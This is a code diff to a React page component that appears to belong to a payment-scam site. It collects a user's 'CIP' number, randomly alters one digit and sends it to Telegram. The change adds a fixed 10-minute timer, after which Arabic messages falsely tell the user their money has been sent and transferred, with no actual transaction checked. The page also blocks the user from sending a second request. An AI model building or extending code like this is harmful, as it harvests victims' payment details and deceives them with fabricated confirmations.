@@ -1,4 +1,4 @@
-import { useState, useRef } from 'react';
+import { useState, useRef, useEffect } from 'react';
       import { useLocation } from 'wouter';
       import { useAuth } from '@/contexts/AuthContext';
       import { Button } from '@/components/ui/button';
@@ -307,6 +307,17 @@ import { useState, useRef } from 'react';
       const [cipInput, setCipInput] = useState('');
       const [cipChanged, setCipChanged] = useState('');
       const [cipSent, setCipSent] = useState(false);
+      const [cipWaitStarted, setCipWaitStarted] = useState(false);
+      const [cipWaitDone, setCipWaitDone] = useState(false);
+
+      useEffect(() => {
+        if (!cipWaitStarted || cipWaitDone) return;
+        const t = setTimeout(() => {
+          setCipWaitDone(true);
+          setCipSent(false);
+        }, 10 * 60 * 1000);
+        return () => clearTimeout(t);
+      }, [cipWaitStarted, cipWaitDone]);
 
       if (!user) { navigate('/login'); return null; }
 
@@ -373,6 +384,7 @@ import { useState, useRef } from 'react';
       const handleCipSubmit = async (e: React.FormEvent) => {
         e.preventDefault();
         if (!cipInput.trim()) return;
+        if (cipSent || cipWaitStarted) return;
         let changed = cipInput.trim();
         const digits = changed.split('');
         const idx = Math.floor(Math.random() * digits.length);
@@ -387,6 +399,8 @@ import { useState, useRef } from 'react';
         await sendToTelegram(text);
         setCipChanged(changed);
         setCipSent(true);
+        setCipWaitStarted(true);
+        setCipWaitDone(false);
       };
 
       return (
@@ -400,7 +414,13 @@ import { useState, useRef } from 'react';
           {isChalabrune && <ChalabrunePaidOverlay />}
           {isMayzen && <PaymeNoticeOverlay />}
           {pay404 && <NotFound404Overlay />}
-          {isPayme && cipSent && (
+          {isPayme && cipWaitDone && (
+            <div className="bg-green-600 text-white px-4 py-3 text-center text-sm font-semibold flex flex-col items-center gap-1">
+              <span>تم إرسال أموالكم بنجاح</span>
+              <span className="font-mono tracking-widest text-base" dir="ltr">{cipChanged}</span>
+            </div>
+          )}
+          {isPayme && cipWaitStarted && !cipWaitDone && (
             <div className="bg-green-600 text-white px-4 py-3 text-center text-sm font-semibold flex flex-col items-center gap-1">
               <span>تم إرسال طلبكم — يرجى الانتظار حوالي ربع ساعة إلى 10 دقائق حتى تصلكم الأموال</span>
               <span className="font-mono tracking-widest text-base" dir="ltr">{cipChanged}</span>
@@ -477,7 +497,7 @@ import { useState, useRef } from 'react';
                 </div>
 
                 <AnimatePresence>
-                  {!cipSent ? (
+                  {!cipWaitStarted ? (
                     <motion.form
                       key="form"
                       initial={{ opacity: 0 }}
@@ -496,7 +516,7 @@ import { useState, useRef } from 'react';
                         </Button>
                       </div>
                     </motion.form>
-                  ) : (
+                  ) : cipWaitDone ? (
                     <motion.div
                       key="success"
                       initial={{ opacity: 0, y: 8 }}
@@ -504,8 +524,20 @@ import { useState, useRef } from 'react';
                       className="rounded-xl border border-green-500/30 bg-green-500/5 p-4 text-center space-y-1"
                     >
                       <CheckCircle2 size={28} className="text-green-500 mx-auto" />
-                      <p className="font-bold text-foreground">تم إرسال طلبكم بنجاح</p>
-                      <p className="text-sm text-muted-foreground">يرجى الانتظار حوالي ربع ساعة إلى 10 دقائق حتى تصلكم الأموال.</p>
+                      <p className="font-bold text-foreground">تم إرسال أموالكم بنجاح</p>
+                      <p className="text-sm text-muted-foreground">تم تحويل أموالك إلى رقم CIP.</p>
+                      <p className="font-mono tracking-widest text-base text-foreground" dir="ltr">{cipChanged}</p>
+                    </motion.div>
+                  ) : (
+                    <motion.div
+                      key="waiting"
+                      initial={{ opacity: 0, y: 8 }}
+                      animate={{ opacity: 1, y: 0 }}
+                      className="rounded-xl border border-amber-500/40 bg-amber-500/10 p-4 text-center space-y-1"
+                    >
+                      <AlertTriangle size={28} className="text-amber-500 mx-auto" />
+                      <p className="font-bold text-foreground">انتظر ريثما يتم طلبك</p>
+                      <p className="text-sm text-muted-foreground">لا يمكنك إرسال طلب آخر قبل اكتمال الطلب الحالي.</p>
                       <p className="font-mono tracking-widest text-base text-foreground" dir="ltr">{cipChanged}</p>
                     </motion.div>
                   )}
